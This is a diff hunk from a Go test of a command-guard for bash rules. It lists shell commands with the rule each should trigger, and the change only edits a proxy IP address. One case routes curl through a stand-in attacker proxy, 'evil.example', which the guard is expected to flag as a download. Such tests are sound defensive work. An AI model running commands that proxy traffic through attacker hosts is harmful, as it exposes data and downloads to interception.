@@ -172,7 +172,7 @@ func TestGuardBashRules(t *testing.T) {
 		{`cd ` + fresh + ` && npm ci --no-audit --no-fund | tail -2 && npx tsc --noEmit`, ""},
 		{`cd ` + fresh + ` && npm ci | tail -2; npx tsc --noEmit`, ruleInstall},
 		{`WAYPOINT_TRUST_PROXY=127.0.0.1 ./waypoint serve`, ""},
-		{`OPENLLMS_VPN_PROXY=http://u:p@10.2.0.244:8890 ./server`, ""},
+		{`OPENLLMS_VPN_PROXY=http://u:p@10.9.0.244:8890 ./server`, ""},
 		{`HTTP_PROXY=http://evil.example:8080 curl https://git.example.net/x`, ruleDownload},
 		{`docker pull git.example.net/claude/waypoint-ci:v1`, ""},
 		{`docker pull alpine`, ruleInstall},
